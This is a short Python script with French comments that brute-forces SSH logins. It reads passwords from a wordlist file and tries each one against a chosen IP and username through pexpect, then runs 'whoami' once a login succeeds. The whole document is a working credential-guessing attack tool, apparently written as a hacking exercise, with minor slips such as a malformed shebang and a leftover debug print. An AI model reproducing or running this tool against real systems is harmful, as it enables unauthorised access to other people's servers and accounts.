#!usr/bin/python3

import pexpect #va nous servir a automatiser le processus de login ssh
from termcolor import cprint, colored

PROMPT = ['# ', '>>> ', '> ', '\$ '] #on s'attend a nous demander ca

def send_command(child, command):
	child.sendline(command) #on envoie la commande a la connection
	child.expect(PROMPT)
	cprint(child.before.decode(), 'yellow') #va print l'output de la command executee sur le systeme cible

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting' #message qui nous demande une reponse
	connStr = 'ssh -oHostKeyAlgorithms=+ssh-dss ' + user + '@' + host #equivaut a la commande ssh user@IP
	child = pexpect.spawn(connStr, timeout=3) #on lance la connection
	ret  = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		cprint('[-] Error Connecting', 'red') #si ca renvoie un 0 c'est qu'on a pas pu se connecter
		return
	if ret == 1:
		print("couo")
		child.sendline('yes') #si ca renvoie un 1 c'est qu'on s'est connnecte, ensuite on veut repondre yes a la question
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword '])
		if ret == 0:
			cprint('[-] Error connecting', 'red')
			return
	child.sendline(password)
	child.expect(PROMPT)
	return child #retourne la conncetion SSH

def main():
	host = input("Enter IP to bruteforce: ")
	user = input("Enter user you want to bruteforce: ")
	file = open("passwords.txt", 'r') #fichier contenant les mdp a tester
	for password in file.readlines():
		password= password.strip('\n')
		try:
			child = connect(user,host,password)
			print(colored('Password found: '+ password, 'green'))
			send_command(child, 'whoami')
			break
		except:
			print(colored('[-] Wrong password: ' + password, 'red'))

main()
